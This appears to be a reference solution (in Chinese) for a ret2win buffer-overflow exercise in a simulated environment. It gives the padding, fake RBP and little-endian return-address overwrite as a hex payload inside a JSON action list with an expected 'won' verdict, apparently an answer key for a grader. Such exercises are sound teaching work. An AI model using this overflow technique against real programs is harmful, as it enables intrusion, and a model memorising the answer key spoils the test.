# ret2win 参考解法

`gets(buf)` 写入 16 字节 padding + 8 字节伪 RBP，再把返回地址覆盖成 win 的地址
`0x400002`（小端序）。`leave` 之后 `ret` 就会跳到 win，win 里 `syscall 99` 判胜。

```json
{
  "actions": [
    { "type": "block", "id": "gets", "args": { "data": "4141414141414141414141414141414142424242424242420200400000000000" } },
    { "type": "step", "count": 3 }
  ],
  "expectedVerdict": "won"
}
```
